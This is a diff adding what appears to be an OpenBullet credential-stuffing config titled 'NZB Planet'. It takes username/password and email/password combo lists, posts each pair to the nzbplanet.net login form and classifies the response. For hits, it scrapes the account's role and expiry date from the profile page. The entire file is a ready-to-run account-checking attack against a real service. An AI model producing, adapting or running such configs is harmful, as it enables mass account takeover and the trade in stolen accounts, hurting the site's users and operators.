@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "NZB Planet",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-08T23:35:05.4017219+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "https://www.nzbplanet.net/login" AutoRedirect=TRUE 
+  CONTENT "redirect=&username=<USER>&password=<PASS>&x=51&y=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#KEYS KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "name=\"UID\"" 
+  KEYCHAIN Retry OR 
+    KEY "" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password." 
+REQUEST GET "https://www.nzbplanet.net/profile" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.nzbplanet.net" 
+#ROLE PARSE "<SOURCE>" CSS "#tabs_main-1 > div.profile_rt > fieldset:nth-child(2) > table > tbody > tr:nth-child(1) > td" "innerHTML" 0 -> CAP "ROLE" "" "" 
+#EXPIRE PARSE "<SOURCE>" CSS "#tabs_main-1 > div.profile_rt > fieldset:nth-child(2) > table > tbody > tr.user_date > td:nth-child(4)" "innerHTML" 0 -> CAP "EXPIRE" "" "" 
